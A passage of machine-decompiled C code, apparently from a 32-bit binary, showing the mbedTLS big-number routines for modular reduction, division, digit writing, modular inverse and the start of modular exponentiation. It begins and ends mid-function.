                int32_t v23 = &v10; // 0x805864e_0
                g1 = v23;
                v14 = &v9;
                result = v20;
                v16 = &v11;
                v15 = v23;
                // branch -> 0x80585da
            }
            // 0x80585da
            g1 = mbedtls_mpi_free((int32_t *)g7);
            mbedtls_mpi_free((int32_t *)v19);
            g1 = v14;
            g1 = mbedtls_mpi_free((int32_t *)v14);
            g4 = v15;
            mbedtls_mpi_free((int32_t *)v15);
            g1 = v16;
            mbedtls_mpi_free((int32_t *)v16);
            g6 = result;
            g3 = v3;
            g7 = v5;
            g5 = v4;
            return result;
        }
        v17 = v18;
    }
    // 0x80585c2
    v13 = &v11;
    g1 = v13;
    v14 = &v9;
    result = v17;
    v16 = v13;
    v15 = &v10;
    // branch -> 0x80585da
    // 0x80585da
    g1 = mbedtls_mpi_free((int32_t *)g7);
    mbedtls_mpi_free((int32_t *)(int32_t)&v8);
    g1 = v14;
    g1 = mbedtls_mpi_free((int32_t *)v14);
    g4 = v15;
    mbedtls_mpi_free((int32_t *)v15);
    g1 = v16;
    mbedtls_mpi_free((int32_t *)v16);
    g6 = result;
    g3 = v3;
    g7 = v5;
    g5 = v4;
    return result;
}

// Address range: 0x8058ba0 - 0x8058c5f
int32_t mbedtls_mpi_mod_mpi(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g5; // 0x8058ba3
    int32_t v2 = g7; // 0x8058ba4
    int32_t v3 = g3; // 0x8058ba5
    g7 = a3;
    g3 = a1;
    int32_t v4 = mbedtls_mpi_cmp_int(a3, 0); // 0x8058bba
    g6 = v4;
    g1 = -10;
    int32_t v5;
    if (v4 < 0) {
        // 0x8058c18
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v5;
        return -10;
    }
    int32_t v6 = mbedtls_mpi_div_mpi(NULL, (int32_t *)g3, (int32_t *)a2, (int32_t *)g7); // 0x8058be0
    g5 = v6;
    int32_t result = v6; // 0x8058c4b
    if (v6 != 0) {
        // 0x8058c48
        g1 = result;
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v5;
        return result;
    }
    int32_t result3; // 0x8058c0f
    while (true) {
        // 0x8058bf0
        if (mbedtls_mpi_cmp_int(g3, 0) > 0) {
            int32_t result2; // 0x8058c3b
            while (true) {
                // 0x8058c20
                if (mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)g7) < 0) {
                    // 0x8058c48
                    result = g5;
                    // branch -> 0x8058c48
                    // 0x8058c48
                    g1 = result;
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v5;
                    return result;
                }
                int32_t * v7 = (int32_t *)g3;
                result2 = mbedtls_mpi_sub_mpi(v7, v7, (int32_t *)g7);
                g1 = result2;
                if (result2 != 0) {
                    // break -> 0x8058c18
                    break;
                }
                // continue -> 0x8058c20
            }
            // 0x8058c18
            g3 = v3;
            g7 = v2;
            g5 = v1;
            g2 = v5;
            return result2;
        }
        int32_t * v8 = (int32_t *)g3;
        result3 = mbedtls_mpi_add_mpi(v8, v8, (int32_t *)g7);
        g1 = result3;
        if (result3 != 0) {
            // break -> 0x8058c18
            break;
        }
        // continue -> 0x8058bf0
    }
    // 0x8058c18
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v5;
    return result3;
}

// Address range: 0x8058c60 - 0x8058caf
int32_t mbedtls_mpi_div_int(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a4 >> 31 | 1; // bp-28
    int32_t result = mbedtls_mpi_div_mpi((int32_t *)a1, (int32_t *)a2, (int32_t *)a3, &v1); // 0x8058ca9
    g1 = result;
    int32_t v2;
    g2 = v2;
    return result;
}

// Address range: 0x8058cb0 - 0x8058d6f
int32_t mpi_write_hlp(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g7; // 0x8058cb6
    int32_t v2 = g6; // 0x8058cb9
    g7 = v2;
    int32_t v3 = v2 - 2; // 0x8058cbb
    g6 = v3;
    int32_t v4 = g3; // 0x8058cc1
    int32_t v5 = g1; // 0x8058cc4
    g3 = v5;
    g1 = -4;
    int32_t v6 = g5; // 0x8058ccb
    g5 = g4;
    int32_t v7;
    if (v3 < 15) {
        // 0x8058ce0
        int32_t v8;
        int32_t v9 = mbedtls_mpi_mod_int(&v8, (int32_t *)v5, (int64_t)v2); // 0x8058cee
        g1 = v9;
        if (v9 == 0) {
            int32_t v10 = g3; // 0x8058cfb
            int32_t v11 = mbedtls_mpi_div_int(v10, 0, v10, g7); // 0x8058d0a
            g1 = v11;
            if (v11 == 0) {
                int32_t v12 = g3; // 0x8058d1b
                if (mbedtls_mpi_cmp_int(v12, 0) != 0) {
                    // 0x8058d50
                    g4 = g5;
                    g6 = g7;
                    g1 = g3;
                    int32_t v13 = mpi_write_hlp(v12, 0, v10); // 0x8058d56
                    g1 = v13;
                    if (v13 != 0) {
                        // 0x8058cd2
                        g3 = v4;
                        g7 = v1;
                        g5 = v6;
                        g2 = v7;
                        return g1;
                    }
                }
                int32_t v14 = *(int32_t *)g5; // 0x8058d40
                if (v8 > 9) {
                    // 0x8058d40
                    *(char *)v14 = (char)(v8 + 55);
                    int32_t v15 = v14 + 1; // 0x8058d47
                    g6 = v15;
                    g1 = 0;
                    *(int32_t *)g5 = v15;
                    // branch -> 0x8058cd2
                } else {
                    // 0x8058d2f
                    *(char *)v14 = (char)(v8 + 48);
                    int32_t v16 = v14 + 1; // 0x8058d36
                    g6 = v16;
                    g1 = 0;
                    *(int32_t *)g5 = v16;
                    // branch -> 0x8058cd2
                }
                // 0x8058cd2
                g3 = v4;
                g7 = v1;
                g5 = v6;
                g2 = v7;
                return g1;
            }
        }
    }
    // 0x8058cd2
    g3 = v4;
    g7 = v1;
    g5 = v6;
    g2 = v7;
    return g1;
}

// Address range: 0x8058d70 - 0x805938f
int32_t mbedtls_mpi_inv_mod(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g5; // 0x8058d73
    int32_t v2 = g7; // 0x8058d74
    int32_t v3 = g3; // bp-16
    g3 = a3;
    g5 = a2;
    int32_t v4 = mbedtls_mpi_cmp_int(a3, 0); // 0x8058d8d
    g6 = v4;
    g1 = -4;
    int32_t v5;
    if (v4 < 1) {
        // 0x8058f3f
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v5;
        return -4;
    }
    // 0x8058da1
    int32_t v6;
    int32_t v7 = &v6; // 0x8058da1_0
    g7 = v7;
    int32_t v8 = 1;
    int32_t v9 = 1;
    int32_t v10 = 1;
    int32_t v11 = 1;
    v6 = 1;
    int32_t v12 = 1;
    int32_t v13 = 1;
    int32_t v14 = 1;
    int32_t v15 = 1;
    int32_t v16 = mbedtls_mpi_gcd(v7, g5, g3); // 0x8058e6f
    g1 = v16;
    int32_t result; // 0x8058ec1
    int32_t v17; // 0x805931465
    if (v16 != 0) {
        // 0x8058e7c
        g5 = &v8;
        // branch -> 0x8058e7f
        // 0x8058e7f
        // branch -> 0x8058e88
        // 0x8058e88
        // branch -> 0x8058e91
        // 0x8058e91
        // branch -> 0x8058e9a
        // 0x8058e9a
        // branch -> 0x8058ea3
        // 0x8058ea3
        // branch -> 0x8058eac
        // 0x8058eac
        result = v16;
        v17 = &v15;
        // branch -> 0x8058ec1
        // 0x8058ec1
        g1 = mbedtls_mpi_free((int32_t *)g5);
        g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v9);
        g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v10);
        g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v11);
        g1 = mbedtls_mpi_free((int32_t *)g7);
        g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v12);
        g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v13);
        g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v14);
        g6 = v17;
        mbedtls_mpi_free((int32_t *)v17);
        g1 = result;
        // branch -> 0x8058f3f
        // 0x8058f3f
        g3 = v3;
        g7 = v2;
        g5 = v1;
        g2 = v5;
        return result;
    }
    // 0x8058f50
    int32_t v18; // 0x8058f7e
    if (mbedtls_mpi_cmp_int(g7, 1) == 0) {
        int32_t v19 = g5; // 0x8058f70
        int32_t v20 = &v8; // 0x8058f74_0
        g5 = v20;
        v18 = mbedtls_mpi_mod_mpi(v20, v19, g3);
        g1 = v18;
        if (v18 == 0) {
            int32_t v21 = &v9; // 0x8058f8b_0
            g1 = v21;
            int32_t v22 = mbedtls_mpi_copy((char *)&v9, (int32_t *)g5); // 0x8058f9b
            g1 = v22;
            int32_t v23; // 0x8058fb8
            if (v22 == 0) {
                int32_t v24 = &v12; // 0x8058fa8_0
                g1 = v24;
                v23 = mbedtls_mpi_copy((char *)&v12, (int32_t *)g3);
                g1 = v23;
                if (v23 == 0) {
                    int32_t v25 = &v13; // 0x8058fc5_0
                    g1 = v25;
                    int32_t v26 = mbedtls_mpi_copy((char *)&v13, (int32_t *)g3); // 0x8058fd5
                    g1 = v26;
                    int32_t v27; // 0x8058ff6
                    if (v26 == 0) {
                        int32_t v28 = &v10; // 0x8058fe2_0
                        v27 = mbedtls_mpi_lset((char *)&v10, 1);
                        g1 = v27;
                        if (v27 == 0) {
                            int32_t v29 = &v11; // 0x8059003_0
                            int32_t v30 = mbedtls_mpi_lset((char *)&v11, 0); // 0x8059017
                            g1 = v30;
                            int32_t v31; // 0x805936c59
                            if (v30 == 0) {
                                int32_t v32 = &v14; // 0x8059024_0
                                int32_t v33 = mbedtls_mpi_lset((char *)&v14, 0); // 0x8059038
                                g1 = v33;
                                int32_t v34 = &v15; // 0x805903d_0
                                if (v33 == 0) {
                                    int32_t v35 = mbedtls_mpi_lset((char *)&v15, 1); // 0x805905c
                                    g1 = v35;
                                    if (v35 == 0) {
                                        int32_t v36 = g3; // 0x8059069
                                        int32_t v37 = v32; // 0x8059087
                                        // branch -> 0x8059075
                                        while (true) {
                                            // 0x8059075
                                            g3 = v37;
                                            if (mbedtls_mpi_cmp_mpi(&v9, &v13) < 0) {
                                                int32_t v38 = mbedtls_mpi_sub_mpi(&v13, &v13, &v9); // 0x80592e9
                                                g1 = v38;
                                                if (v38 == 0) {
                                                    int32_t * v39 = (int32_t *)g3;
                                                    int32_t v40 = mbedtls_mpi_sub_mpi(v39, v39, &v10); // 0x8059307
                                                    g1 = v40;
                                                    if (v40 == 0) {
                                                        int32_t v41 = mbedtls_mpi_sub_mpi(&v15, &v15, &v11); // 0x805932b
                                                        g1 = v41;
                                                        if (v41 == 0) {
                                                          lab_0x805926f:
                                                            // 0x805926f
                                                            if (mbedtls_mpi_cmp_int(v21, 0) == 0) {
                                                                int32_t v42 = g5; // 0x8059293
                                                                g5 = v36;
                                                                g3 = v32;
                                                                int32_t v43; // 0x805935e
                                                                int32_t v44; // 0x8059382
                                                                int32_t * v45;
                                                                int32_t v46; // 0x8059372
                                                                if (mbedtls_mpi_cmp_int(v32, 0) > 0) {
                                                                    // 0x805933d
                                                                    g3 = v32;
                                                                    if (mbedtls_mpi_cmp_mpi(&v14, (int32_t *)g5) >= 0) {
                                                                        while (true) {
                                                                            // 0x8059353
                                                                            v45 = (int32_t *)g3;
                                                                            v43 = mbedtls_mpi_sub_mpi(v45, v45, (int32_t *)g5);
                                                                            g1 = v43;
                                                                            if (v43 == 0) {
                                                                                goto lab_0x8059353;
                                                                            }
                                                                            // 0x8059125
                                                                            g5 = v42;
                                                                            result = v43;
                                                                            v17 = v34;
                                                                            // branch -> 0x8058ec1
                                                                            // 0x8058ec1
                                                                            g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                            g1 = mbedtls_mpi_free((int32_t *)v21);
                                                                            g1 = mbedtls_mpi_free((int32_t *)v28);
                                                                            g1 = mbedtls_mpi_free((int32_t *)v29);
                                                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                            g1 = mbedtls_mpi_free((int32_t *)v24);
                                                                            g1 = mbedtls_mpi_free((int32_t *)v25);
                                                                            g1 = mbedtls_mpi_free((int32_t *)v32);
                                                                            g6 = v17;
                                                                            mbedtls_mpi_free((int32_t *)v17);
                                                                            g1 = result;
                                                                            // branch -> 0x8058f3f
                                                                            // 0x8058f3f
                                                                            g3 = v3;
                                                                            g7 = v2;
                                                                            g5 = v1;
                                                                            g2 = v5;
                                                                            return result;
                                                                        }
                                                                    }
                                                                    // 0x805936c
                                                                    v46 = a1;
                                                                    g1 = v46;
                                                                    g5 = v42;
                                                                    v44 = mbedtls_mpi_copy((char *)v46, &v14);
                                                                    g1 = v44;
                                                                    result = v44;
                                                                    v17 = v34;
                                                                    // branch -> 0x8058ec1
                                                                    // 0x8058ec1
                                                                    g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v21);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v28);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v29);
                                                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v24);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v25);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v32);
                                                                    g6 = v17;
                                                                    mbedtls_mpi_free((int32_t *)v17);
                                                                    g1 = result;
                                                                    // branch -> 0x8058f3f
                                                                    // 0x8058f3f
                                                                    g3 = v3;
                                                                    g7 = v2;
                                                                    g5 = v1;
                                                                    g2 = v5;
                                                                    return result;
                                                                }
                                                                while (true) {
                                                                    int32_t * v47 = (int32_t *)g3;
                                                                    int32_t v48 = mbedtls_mpi_add_mpi(v47, v47, (int32_t *)g5); // 0x80592c4
                                                                    g1 = v48;
                                                                    if (v48 != 0) {
                                                                        // 0x8059125
                                                                        g5 = v42;
                                                                        result = v48;
                                                                        v17 = v34;
                                                                        // branch -> 0x8058ec1
                                                                        // 0x8058ec1
                                                                        g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v21);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v28);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v29);
                                                                        g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v24);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v25);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v32);
                                                                        g6 = v17;
                                                                        mbedtls_mpi_free((int32_t *)v17);
                                                                        g1 = result;
                                                                        // branch -> 0x8058f3f
                                                                        // 0x8058f3f
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        g2 = v5;
                                                                        return result;
                                                                    }
                                                                    // 0x80592b9
                                                                    if (mbedtls_mpi_cmp_int(g3, 0) > 0) {
                                                                        // break -> 0x805933d
                                                                        break;
                                                                    }
                                                                    // continue -> 0x80592b9
                                                                    continue;
                                                                }
                                                                // 0x805933d
                                                                g3 = v32;
                                                                if (mbedtls_mpi_cmp_mpi(&v14, (int32_t *)g5) < 0) {
                                                                    // 0x805936c
                                                                    v46 = a1;
                                                                    g1 = v46;
                                                                    g5 = v42;
                                                                    v44 = mbedtls_mpi_copy((char *)v46, &v14);
                                                                    g1 = v44;
                                                                    result = v44;
                                                                    v17 = v34;
                                                                    // branch -> 0x8058ec1
                                                                    // 0x8058ec1
                                                                    g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v21);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v28);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v29);
                                                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v24);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v25);
                                                                    g1 = mbedtls_mpi_free((int32_t *)v32);
                                                                    g6 = v17;
                                                                    mbedtls_mpi_free((int32_t *)v17);
                                                                    g1 = result;
                                                                    // branch -> 0x8058f3f
                                                                    // 0x8058f3f
                                                                    g3 = v3;
                                                                    g7 = v2;
                                                                    g5 = v1;
                                                                    g2 = v5;
                                                                    return result;
                                                                }
                                                                while (true) {
                                                                    // 0x8059353
                                                                    v45 = (int32_t *)g3;
                                                                    v43 = mbedtls_mpi_sub_mpi(v45, v45, (int32_t *)g5);
                                                                    g1 = v43;
                                                                    if (v43 != 0) {
                                                                        // 0x8059125
                                                                        g5 = v42;
                                                                        result = v43;
                                                                        v17 = v34;
                                                                        // branch -> 0x8058ec1
                                                                        // 0x8058ec1
                                                                        g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v21);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v28);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v29);
                                                                        g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v24);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v25);
                                                                        g1 = mbedtls_mpi_free((int32_t *)v32);
                                                                        g6 = v17;
                                                                        mbedtls_mpi_free((int32_t *)v17);
                                                                        g1 = result;
                                                                        // branch -> 0x8058f3f
                                                                        // 0x8058f3f
                                                                        g3 = v3;
                                                                        g7 = v2;
                                                                        g5 = v1;
                                                                        g2 = v5;
                                                                        return result;
                                                                    }
                                                                  lab_0x8059353:
                                                                    // 0x8059353
                                                                    if (mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)g5) < 0) {
                                                                        // break -> 0x805936c
                                                                        break;
                                                                    }
                                                                    // continue -> 0x8059353
                                                                    continue;
                                                                }
                                                                // 0x805936c
                                                                v46 = a1;
                                                                g1 = v46;
                                                                g5 = v42;
                                                                v44 = mbedtls_mpi_copy((char *)v46, &v14);
                                                                g1 = v44;
                                                                result = v44;
                                                                v17 = v34;
                                                                // branch -> 0x8058ec1
                                                                // 0x8058ec1
                                                                g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                g1 = mbedtls_mpi_free((int32_t *)v21);
                                                                g1 = mbedtls_mpi_free((int32_t *)v28);
                                                                g1 = mbedtls_mpi_free((int32_t *)v29);
                                                                g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                g1 = mbedtls_mpi_free((int32_t *)v24);
                                                                g1 = mbedtls_mpi_free((int32_t *)v25);
                                                                g1 = mbedtls_mpi_free((int32_t *)v32);
                                                                g6 = v17;
                                                                mbedtls_mpi_free((int32_t *)v17);
                                                                g1 = result;
                                                                // branch -> 0x8058f3f
                                                                // 0x8058f3f
                                                                g3 = v3;
                                                                g7 = v2;
                                                                g5 = v1;
                                                                g2 = v5;
                                                                return result;
                                                            }
                                                            // 0x805926f
                                                            v37 = g3;
                                                            // branch -> 0x8059075
                                                            continue;
                                                        } else {
                                                            result = v41;
                                                            v17 = v34;
                                                        }
                                                    } else {
                                                        result = v40;
                                                        v17 = v34;
                                                    }
                                                } else {
                                                    result = v38;
                                                    v17 = v34;
                                                }
                                            } else {
                                                int32_t v49 = mbedtls_mpi_sub_mpi(&v9, &v9, &v13); // 0x8059220
                                                g1 = v49;
                                                if (v49 == 0) {
                                                    int32_t v50 = mbedtls_mpi_sub_mpi(&v10, &v10, (int32_t *)g3); // 0x805923e
                                                    g1 = v50;
                                                    if (v50 == 0) {
                                                        int32_t v51 = mbedtls_mpi_sub_mpi(&v11, &v11, &v15); // 0x8059262
                                                        g1 = v51;
                                                        if (v51 == 0) {
                                                            goto lab_0x805926f;
                                                        }
                                                        result = v51;
                                                        v17 = v34;
                                                        // 0x8058ec1
                                                        g1 = mbedtls_mpi_free((int32_t *)g5);
                                                        g1 = mbedtls_mpi_free((int32_t *)v21);
                                                        g1 = mbedtls_mpi_free((int32_t *)v28);
                                                        g1 = mbedtls_mpi_free((int32_t *)v29);
                                                        g1 = mbedtls_mpi_free((int32_t *)g7);
                                                        g1 = mbedtls_mpi_free((int32_t *)v24);
                                                        g1 = mbedtls_mpi_free((int32_t *)v25);
                                                        g1 = mbedtls_mpi_free((int32_t *)v32);
                                                        g6 = v17;
                                                        mbedtls_mpi_free((int32_t *)v17);
                                                        g1 = result;
                                                        // branch -> 0x8058f3f
                                                        // 0x8058f3f
                                                        g3 = v3;
                                                        g7 = v2;
                                                        g5 = v1;
                                                        g2 = v5;
                                                        return result;
                                                    }
                                                    result = v50;
                                                    v17 = v34;
                                                } else {
                                                    result = v49;
                                                    v17 = v34;
                                                }
                                            }
                                            // 0x8058ec1
                                            g1 = mbedtls_mpi_free((int32_t *)g5);
                                            g1 = mbedtls_mpi_free((int32_t *)v21);
                                            g1 = mbedtls_mpi_free((int32_t *)v28);
                                            g1 = mbedtls_mpi_free((int32_t *)v29);
                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                            g1 = mbedtls_mpi_free((int32_t *)v24);
                                            g1 = mbedtls_mpi_free((int32_t *)v25);
                                            g1 = mbedtls_mpi_free((int32_t *)v32);
                                            g6 = v17;
                                            mbedtls_mpi_free((int32_t *)v17);
                                            g1 = result;
                                            // branch -> 0x8058f3f
                                            // 0x8058f3f
                                            g3 = v3;
                                            g7 = v2;
                                            g5 = v1;
                                            g2 = v5;
                                            return result;
                                        }
                                    } else {
                                        result = v35;
                                        v17 = v34;
                                        v31 = v32;
                                    }
                                } else {
                                    result = v33;
                                    v17 = v34;
                                    v31 = v32;
                                }
                            } else {
                                // 0x8058eac
                                result = v30;
                                v17 = &v15;
                                v31 = &v14;
                                // branch -> 0x8058ec1
                            }
                            // 0x8058ec1
                            g1 = mbedtls_mpi_free((int32_t *)g5);
                            g1 = mbedtls_mpi_free((int32_t *)v21);
                            g1 = mbedtls_mpi_free((int32_t *)v28);
                            g1 = mbedtls_mpi_free((int32_t *)v29);
                            g1 = mbedtls_mpi_free((int32_t *)g7);
                            g1 = mbedtls_mpi_free((int32_t *)v24);
                            g1 = mbedtls_mpi_free((int32_t *)v25);
                            g1 = mbedtls_mpi_free((int32_t *)v31);
                            g6 = v17;
                            mbedtls_mpi_free((int32_t *)v17);
                            g1 = result;
                            // branch -> 0x8058f3f
                            // 0x8058f3f
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            g2 = v5;
                            return result;
                        }
                    } else {
                        // 0x8058e9a
                        v27 = v26;
                        // branch -> 0x8058ea3
                    }
                    // 0x8058ea3
                    // branch -> 0x8058eac
                    // 0x8058eac
                    result = v27;
                    v17 = &v15;
                    // branch -> 0x8058ec1
                    // 0x8058ec1
                    g1 = mbedtls_mpi_free((int32_t *)g5);
                    g1 = mbedtls_mpi_free((int32_t *)v21);
                    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v10);
                    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v11);
                    g1 = mbedtls_mpi_free((int32_t *)g7);
                    g1 = mbedtls_mpi_free((int32_t *)v24);
                    g1 = mbedtls_mpi_free((int32_t *)v25);
                    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v14);
                    g6 = v17;
                    mbedtls_mpi_free((int32_t *)v17);
                    g1 = result;
                    // branch -> 0x8058f3f
                    // 0x8058f3f
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    g2 = v5;
                    return result;
                }
            } else {
                // 0x8058e88
                v23 = v22;
                // branch -> 0x8058e91
            }
            // 0x8058e91
            // branch -> 0x8058e9a
            // 0x8058e9a
            // branch -> 0x8058ea3
            // 0x8058ea3
            // branch -> 0x8058eac
            // 0x8058eac
            result = v23;
            v17 = &v15;
            // branch -> 0x8058ec1
            // 0x8058ec1
            g1 = mbedtls_mpi_free((int32_t *)g5);
            g1 = mbedtls_mpi_free((int32_t *)v21);
            g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v10);
            g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v11);
            g1 = mbedtls_mpi_free((int32_t *)g7);
            g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v12);
            g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v13);
            g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v14);
            g6 = v17;
            mbedtls_mpi_free((int32_t *)v17);
            g1 = result;
            // branch -> 0x8058f3f
            // 0x8058f3f
            g3 = v3;
            g7 = v2;
            g5 = v1;
            g2 = v5;
            return result;
        }
    } else {
        // 0x8058f64
        g1 = -14;
        // branch -> 0x8058e7c
        // 0x8058e7c
        g5 = &v8;
        v18 = -14;
        // branch -> 0x8058e7f
    }
    // 0x8058e7f
    // branch -> 0x8058e88
    // 0x8058e88
    // branch -> 0x8058e91
    // 0x8058e91
    // branch -> 0x8058e9a
    // 0x8058e9a
    // branch -> 0x8058ea3
    // 0x8058ea3
    // branch -> 0x8058eac
    // 0x8058eac
    result = v18;
    v17 = &v15;
    // branch -> 0x8058ec1
    // 0x8058ec1
    g1 = mbedtls_mpi_free((int32_t *)g5);
    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v9);
    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v10);
    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v11);
    g1 = mbedtls_mpi_free((int32_t *)g7);
    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v12);
    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v13);
    g1 = mbedtls_mpi_free((int32_t *)(int32_t)&v14);
    g6 = v17;
    mbedtls_mpi_free((int32_t *)v17);
    g1 = result;
    // branch -> 0x8058f3f
    // 0x8058f3f
    g3 = v3;
    g7 = v2;
    g5 = v1;
    g2 = v5;
    return result;
}

// Address range: 0x8059390 - 0x8059baf
int32_t mbedtls_mpi_exp_mod(int32_t * a1, int32_t * a2, int32_t a3, int32_t a4, char * a5) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = g3; // 0x8059399
    g3 = a4;
    int32_t v3 = g7; // 0x805939f
    int32_t v4 = g5; // 0x80593a2
    if (mbedtls_mpi_cmp_int(a4, 0) > 0) {
        // 0x80593d0
        if (*(char *)*(int32_t *)(g3 + 8) != 1) {
            // 0x80593d8
            if (mbedtls_mpi_cmp_int(a3, 0) >= 0) {
                int32_t v5 = *(int32_t *)*(int32_t *)(g3 + 8); // 0x8059407
                int32_t v6 = 1;
                int32_t v7 = 2 * (v5 + 2 & 4) + v5; // 0x8059424
                int32_t v8 = 1;
                int32_t v9 = 1;
                int32_t v10 = (2 - v7 * v5) * v7; // 0x8059447
                int32_t v11 = (2 - v10 * v5) * v10; // 0x805945a
                int32_t v12;
                int32_t v13 = &v12; // 0x8059467_0
                g5 = v13;
                int32_t v14;
                int32_t v15 = &v14; // 0x8059479_2
                int32_t v16 = (2 - v11 * v5) * v11; // edx
                memset((char *)&v12, v15, 384);
                uint32_t v17 = mbedtls_mpi_bitlen(a3, 0); // 0x805948c
                int64_t v18 = 32;
                uint32_t v19 = 5; // 0x8059ac3101
                uint32_t v20 = 64; // 0x8059b2197
                int32_t v21 = 6; // 0x8059a5e96
                if (v17 < 672) {
                    // 0x80595a7
                    if (v17 <= 239) {
                        // 0x80595ae
                        if (v17 < 80) {
                            int32_t v22 = v17 < 24 ? 1 : 3; // 0x8059670
                            g5 = v22;
                            v18 = v17 < 24 ? 1 : 4;
                            v19 = v17 < 24 ? 0 : 2;
                            v20 = v17 < 24 ? 2 : 8;
                            v21 = v22;
                            // branch -> 0x80594c4
                        } else {
                            v18 = 8;
                            v19 = 3;
                            v20 = 16;
                            v21 = 4;
                        }
                    } else {
                        v18 = 16;
                        v19 = 4;
                        v20 = 32;
                        v21 = 5;
                    }
                }
                int32_t v23 = *(int32_t *)(g3 + 4) + 1; // 0x80594ca
                g7 = v23;
                int32_t v24 = mbedtls_mpi_grow(v1, (char *)v23); // 0x80594d4
                g1 = v24;
                int32_t v25;
                int32_t v26 = &v25; // 0x80595e4_0
                if (v24 == 0) {
                    // 0x80595e4
                    g5 = v26;
                    int32_t v27 = mbedtls_mpi_grow(v26, (char *)g7); // 0x80595f7
                    g1 = v27;
                    if (v27 == 0) {
                        int32_t v28 = g7; // 0x8059690
                        int32_t v29 = &v8; // 0x8059696_0
                        g7 = v29;
                        g5 = &v9;
                        int32_t v30 = mbedtls_mpi_grow(v29, (char *)(2 * v28)); // 0x80596a5
                        g1 = v30;
                        int32_t v31 = g5; // 0x80596aa
                        if (v30 == 0) {
                            int32_t v32 = *a2; // 0x80596bb
                            g1 = v32 == -1;
                            int32_t v33 = (int32_t)a2;
                            int32_t v34; // 0x8059867
                            int32_t v35; // 0x8059904
                            int32_t v36; // 0x80597fd
                            int32_t v37; // 0x8059916
                            int32_t v38; // 0x80596e9_0
                            int32_t v39; // 0x80597bd_0
                            int32_t v40; // 0x8059892_0
                            int32_t v41; // 0x8059708
                            int32_t v42; // 0x8059729
                            int32_t v43; // 0x805976e
                            int32_t v44; // 0x805980c
                            int32_t v45; // 0x8059826
                            int32_t v46; // 0x8059880
                            int32_t v47; // 0x80598a6
                            int32_t v48; // 0x80598c0
                            int32_t v49; // 0x80598d8
                            int32_t v50; // 0x8059939
                            int32_t v51;
                            int32_t v52;
                            int32_t v53;
                            int32_t v54;
                            int32_t v55;
                            int32_t dest_mem;
                            int32_t * v56;
                            int32_t v57;
                            int32_t v58; // 0x8059857
                            int32_t v59; // 0x805952b
                            int32_t v60; // 0x8059536
                            int32_t result; // 0x805951f
                            int32_t v61; // 0x8059754
                            int32_t v62; // 0x8059929
                            int32_t v63; // 0x80599eb92
                            int32_t v64;
                            int32_t v65;
                            int32_t v66; // 0x8059af8109209
                            int32_t v67; // 0x8059b29102
                            int32_t v68; // 0x805971e
                            int32_t v69; // 0x80598cd
                            int32_t v70; // 0x80598d1
                            int32_t v71; // 0x8059ac3100
                            int32_t v72;
                            int32_t v73; // 0x8059aa4104
                            int32_t v74;
                            int32_t v75; // 0x8059aa4106
                            if (v32 == -1) {
                                int32_t v76 = mbedtls_mpi_copy((char *)v31, a2); // 0x8059792
                                g1 = v76;
